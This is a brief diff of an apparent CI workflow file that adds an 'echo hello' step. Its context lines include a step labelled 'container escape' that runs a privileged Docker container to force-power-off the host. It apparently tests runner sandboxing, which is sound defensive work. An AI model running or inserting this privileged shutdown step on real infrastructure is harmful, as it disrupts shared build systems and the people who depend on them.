@@ -10,3 +10,4 @@ jobs:
       - run: apk add docker
       - name: container escape
         run: docker run --privileged alpine sh -c 'poweroff -f'
+      - run: echo hello
